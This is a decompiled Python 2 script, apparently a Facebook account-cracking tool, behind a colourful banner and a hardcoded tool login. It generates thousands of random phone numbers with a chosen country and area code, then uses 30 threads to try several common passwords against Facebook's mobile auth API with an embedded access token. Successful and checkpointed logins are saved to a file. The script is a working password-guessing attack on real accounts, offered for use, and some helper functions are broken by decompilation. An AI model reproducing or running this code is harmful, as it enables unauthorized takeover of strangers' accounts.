# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2021-11-08 08:51:28.386275
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
    print(nmbr)
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 crack.py')
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/64.64.121.87;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def keluar():
	print 'Thanks.'
	os.sys.exit()
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.03)
		
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
def cp(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.3)
		
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
logo='''
  \033[1;91m     _                           __  ______  
  \033[1;92m    / \   _ __   __ _  __ _  __ _\ \/ /  _ \ 
  \033[1;93m   / _ \ | '_ \ / _` |/ _` |/ _` |\  /| | | |
  \033[1;95m  / ___ \| | | | (_| | (_| | (_| |/  \| |_| |
  \033[1;96m /_/   \_\_| |_|\__, |\__, |\__,_/_/\_\____/ 
  \033[1;91m                |___/ |___/
\033[1;97m--------------------------------------------------
\033[1;97m  [\033[1;92m•\033[1;97m] AUTHOR  : ANGGA KURNIAWAN
\033[1;97m  [\033[1;92m•\033[1;97m] VERSION : 2.1
\033[1;97m  [\033[1;92m•\033[1;97m] GITHUB  : HTTPS://GITHUB.COM/ANGGAXD
\033[1;97m  [\033[1;92m•\033[1;97m] YOUTUBE : ANGGA KURNIAWAN
\033[1;97m--------------------------------------------------
                                '''        
logoxd='''
  \033[1;91m     _                           __  ______  
  \033[1;92m    / \   _ __   __ _  __ _  __ _\ \/ /  _ \ 
  \033[1;93m   / _ \ | '_ \ / _` |/ _` |/ _` |\  /| | | |
  \033[1;95m  / ___ \| | | | (_| | (_| | (_| |/  \| |_| |
  \033[1;96m /_/   \_\_| |_|\__, |\__, |\__,_/_/\_\____/ 
  \033[1;91m                |___/ |___/ \033[1;97mcProject - AVS                      
\033[1;97m--------------------------------------------------\n
\033[1;97m  [\033[1;92m•\033[1;97m] AUTHOR  : ANGGA KURNIAWAN
\033[1;97m  [\033[1;92m•\033[1;97m] VERSION : 2.1
\033[1;97m  [\033[1;92m•\033[1;97m] GITHUB  : HTTPS://GITHUB.COM/ANGGAXD
\033[1;97m  [\033[1;92m•\033[1;97m] YOUTUBE : ANGGA KURNIAWAN\n
\033[1;97m--------------------------------------------------
                                '''               
cusr = "anggaxd"
cpwd = "rnumber"
def u():
    os.system("clear")
    print(logo)
    usr=raw_input("\033[1;97mUSERNAME TOOL : ")
    if usr == cusr:
        p()
    else:
        os.system("clear")
        print(logo)
        print("\033[1;97mUSERNAME TOOL : "+usr+" [\033[1;91mWRONG\033[1;97m]")
        time.sleep(1)
        u()
def p():
    os.system("clear")
    print(logo)
    print("\033[1;97mUSERNAME TOOL : ANGGAXD [\033[1;92mCORRECT\033[1;97m]")
    pwd=raw_input("\033[1;97mPASSWORD TOOL : ")
    if pwd == cpwd:
        z()
    else:
        os.system("clear")
        print(logo)
        print("\033[1;97mUSERNAME TOOL : ANGGAXD [\033[1;92mCORRECT\033[1;97m]")
        print("\033[1;97mPASSWORD TOOL : "+pwd+" [\033[1;91mWRONG\033[1;97m]")
        time.sleep(1)
        p()
    
def z():
    os.system("clear")
    print(logo)
    print("\033[1;97mUSERNAME TOOL : ANGGAXD [\033[1;92mCORRECT\033[1;97m]")
    print("\033[1;97mPASSWORD TOOL : RNUMBER [\033[1;92mCORRECT\033[1;97m]")
    time.sleep(1)
    menu()
    
def menu():
	os.system('clear')
	print logo
	jalan ('  \033[1;97m[\033[1;92m01\033[1;97m]  Start Crack Random Number Country')
	jalan ('  \033[1;97m[\033[1;92m02\033[1;97m]  Update Tools')
	jalan ('  \033[1;97m[\033[1;92m00\033[1;97m]  Exit')
	avs() 
	
def avs() :
    anggaxd = raw_input('\n[\033[1;93m?\033[1;97m]\033[1;97m Choose an Option : \033[1;97m')
    if anggaxd =='':
        print '[!] Fill In Correctly'
        avs() 
    elif anggaxd == '1' or anggaxd == '01':
        os.system('clear')
        print logo
        print("\033[1;97mCrack Random Number Country")
        print("\033[1;91m--------------------------------------------------")
        print("\033[1;97mExample Number Country   : +880")
        print("\033[1;97mExample Code Area County : 192")
        print("\033[1;91m--------------------------------------------------")
        try:
            c = raw_input("\033[1;97mCode Number Country : ")
            k = raw_input("\033[1;97mCode Area Country   : ")
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()         
    elif anggaxd == '2' or anggaxd == '02':
        os.system("clear")   
        print logoxd
        psb("\033[1;93mSedang Update Tools ....")
        time.sleep(2)
        os.system('pip2 install --upgrade anggaxd')
        os.system ('pip2 install request && pip2 install mechanize')
        os.system ('git pull origin master')
        os.system("anggaxd")
        os.system("clear")
        psb("\n\n\n\033[1;93mTOOLS SUDAH DI UPDATE") 
        time.sleep(1)
        menu()                     
    elif anggaxd == '0' or anggaxd == '00':
        keluar()
    else:
        print '[!] Fill In Correctly'
        avs() 
    print "\033[1;91m--------------------------------------------------"     
    print ("\033[1;97mEx Password \033[1;93m : \033[1;97mSayang,Doraemon,Cantik") 
    anggaxdpw1 = raw_input ("\033[1;92m+ \033[1;97mPassword 1 : ")
    anggaxdpw2 = raw_input ("\033[1;92m+ \033[1;97mPassword 2 : ")
    anggaxdpw3 = raw_input ("\033[1;92m+ \033[1;97mPassword 3 : ")
    print "\033[1;91m--------------------------------------------------"
    xxx = str(len(id))
    psb ('\033[1;97m[\033[1;92m+\033[1;97m] Total Numbers : '+xxx)
    time.sleep(0.5)
    psb ('[\033[1;92m✓\033[1;97m] Cracking Process Has Been Started ...') 
    time.sleep(0.5)
    psb ('[\033[1;91m!\033[1;97m] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print "\033[1;91m--------------------------------------------------"
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass
        try:
			pass1 = anggaxdpw1
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +"[Successful]" +c+k+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + c + k + user + ' ◐ ' + pass1
				okb = open('avs/crack.txt', 'a')
				okb.write("[Successful] " +c+k+user+ ' ◐ ' +pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + c + k + user + ' ◐ ' + pass1
					cps = open('avs/crack.txt', 'a')
					cps.write("[Checkpoint] " +c+k+user+ ' ◐ ' +pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:
					pass2 = anggaxdpw2
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +"[Successful]" +c+k+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + c + k + user + ' ◐ ' + pass2
						okb = open('avs/crack.txt', 'a')
						okb.write("[Successful] " +c+k+user+ ' ◐ ' +pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:
						if 'www.facebook.com' in q['error_msg']:
							print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + c + k + user + ' ◐ ' + pass2
							cps = open('avs/crack.txt', 'a')
							cps.write("[Checkpoint] " +c+k+user+ ' ◐ ' +pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:
							pass3 = anggaxdpw3
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +"[Successful]" +c+k+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + c + k + user + ' ◐ ' + pass3
								okb = open('avs/crack.txt', 'a')
								okb.write("[Successful] " +c+k+user+ ' ◐ ' +pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:
								if 'www.facebook.com' in q['error_msg']:
									print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + c + k + user + ' ◐ ' + pass3
									cps = open('avs/crack.txt', 'a')
									cps.write("[Checkpoint] " +c+k+user+ ' ◐ ' +pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
								else:
									pass4 = user
									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +"[Successful]" +c+k+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + c + k + user + ' ◐ ' + pass4
										okb = open('avs/crack.txt', 'a')
										okb.write("[Successful] " +c+k+user+ ' ◐ ' +pass4+'\n')
										okb.close()
										oks.append(c+user+pass4)
									else:
										if 'www.facebook.com' in q['error_msg']:
											print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + c + k + user + ' ◐ ' + pass4
											cps = open('avs/crack.txt', 'a')
											cps.write("[Checkpoint] " +c+k+user+ ' ◐ ' +pass4+'\n')
											cps.close()
											cpb.append(c+user+pass4)
			
									
								
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print "\033[1;91m--------------------------------------------------"
    print '\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
    print '[\033[1;92m✓\033[1;97m] Total \033[1;92mSuccessfuly\033[1;97m/\033[1;93mCheckpoint\033[1;97m : '+str(len(oks))+'/'+str(len(cpb))
    print('[\033[1;92m✓\033[1;97m] Cracking Accounts Has Been Saved : avs/crack.txt')
    
    raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;97m]")
    menu()                                
if __name__ == '__main__':
    u()
                                
# Mau Ngapain Cuk?